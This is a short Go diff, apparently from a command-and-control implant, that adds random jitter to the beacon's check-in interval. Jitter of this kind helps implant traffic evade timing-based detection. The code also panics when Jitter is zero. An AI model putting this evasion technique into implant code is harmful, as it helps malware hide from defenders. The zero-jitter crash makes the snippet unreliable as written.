@@ -22,6 +22,7 @@ import (
 	// {{if .Config.Debug}}
 	"crypto/tls"
 	"log"
+	insecureRand "math/rand"
 	"net"
 
 	// {{end}}
@@ -55,6 +56,7 @@ type BeaconClose func() error
 // Beacon - Abstract connection to the server
 type Beacon struct {
 	Interval int64
+	Jitter   int64
 	Start    BeaconStart
 	Send     BeaconSend
 	Recv     BeaconRecv
@@ -62,7 +64,7 @@ type Beacon struct {
 }
 
 func (b *Beacon) Duration() time.Duration {
-	return time.Duration(b.Interval)
+	return time.Duration(b.Interval) + time.Duration(int64(insecureRand.Intn(int(b.Jitter))))
 }
 
 func StartBeaconLoop() *Beacon {
